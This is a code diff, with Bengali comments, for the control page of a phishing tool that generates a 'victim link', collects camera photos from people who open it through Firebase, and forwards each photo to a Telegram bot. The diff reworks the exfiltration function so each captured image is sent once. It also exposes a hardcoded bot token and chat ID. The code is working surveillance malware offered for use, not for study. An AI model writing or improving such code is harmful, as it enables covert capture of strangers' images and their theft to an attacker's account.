@@ -61,7 +61,7 @@ footer a{color:#3b82f6;text-decoration:none;font-weight:600}
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
 <script>
-// তোমার বট (আমি টেস্ট করেছি — কাজ করে)
+// তোমার বট
 const BOT_TOKEN = "8214148154:AAH5jfutrpIUR5NxR1Ed522IysoLhQ6YhWY";
 const CHAT_ID = "7731349577";
 
@@ -70,6 +70,8 @@ firebase.initializeApp(firebaseConfig);
 const db = firebase.database();
 
 let currentId = localStorage.getItem("currentCamId") || null;
+let telegramSent = new Set(); // এই সেট দিয়ে ট্র্যাক করবো কোন ছবি পাঠানো হয়েছে
+
 if(currentId){
   document.getElementById("linkBox").style.display = "block";
   document.getElementById("victimLink").value = location.href.split('index.html')[0] + "view.html?id=" + currentId;
@@ -79,6 +81,7 @@ if(currentId){
 function generateLink(){
   currentId = Date.now().toString(36);
   localStorage.setItem("currentCamId", currentId);
+  telegramSent.clear(); // নতুন লিংক হলে পুরানো রেকর্ড মুছে ফেলো
   const link = location.href.split('index.html')[0] + "view.html?id=" + currentId;
   document.getElementById("linkBox").style.display = "block";
   document.getElementById("victimLink").value = link;
@@ -93,26 +96,21 @@ function copyLink(){
   alert("কপি হয়ে গেছে!");
 }
 
-// টেলিগ্রামে ছবি পাঠানো (এখন ১০০% কাজ করে)
-async function sendToTelegram(base64){
-  try {
-    // base64 থেকে blob বানাও
-    const response = await fetch(base64);
-    const blob = await response.blob();
-    const file = new File([blob], "photo.jpg", {type: "image/jpeg"});
+// টেলিগ্রামে শুধু একবার পাঠাবে
+async function sendToTelegramOnce(base64, timestamp){
+  if(telegramSent.has(timestamp)) return; // ইতিমধ্যে পাঠানো হয়েছে
+  telegramSent.add(timestamp);
 
+  try{
+    const blob = await (await fetch(base64)).blob();
+    const file = new File([blob], "photo.jpg", {type: "image/jpeg"});
     const form = new FormData();
     form.append('chat_id', CHAT_ID);
     form.append('photo', file);
-    form.append('caption', `নতুন ছবি এসেছে!\nলিংক: ${location.href.split('index.html')[0] + "view.html?id=" + currentId}\nসময়: ${new Date().toLocaleString()}`);
+    form.append('caption', `নতুন ছবি এসেছে!\nলিংক: ${location.href.split('index.html')[0] + "view.html?id=" + currentId}`);
 
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-      method: 'POST',
-      body: form
-    });
-  } catch(e) {
-    console.log("Telegram error:", e);
-  }
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method:'POST', body:form});
+  }catch(e){}
 }
 
 function loadPhotos(id){
@@ -125,10 +123,10 @@ function loadPhotos(id){
     card.innerHTML = `<img src="${data.data}" onclick="window.open('${data.data}')"><div class="time">${new Date(data.time).toLocaleTimeString('bn-BD')}</div>`;
     document.getElementById("grid").appendChild(card);
 
-    // টেলিগ্রামে পাঠাও
-    sendToTelegram(data.data);
+    // শুধু একবার টেলিগ্রামে পাঠাবে
+    sendToTelegramOnce(data.data, data.time);
   });
-  setTimeout(()=>{ ref.remove(); localStorage.removeItem("currentCamId"); }, 3600000);
+  setTimeout(()=>{ ref.remove(); localStorage.removeItem("currentCamId"); telegramSent.clear(); }, 3600000);
 }
 </script>
 </body>
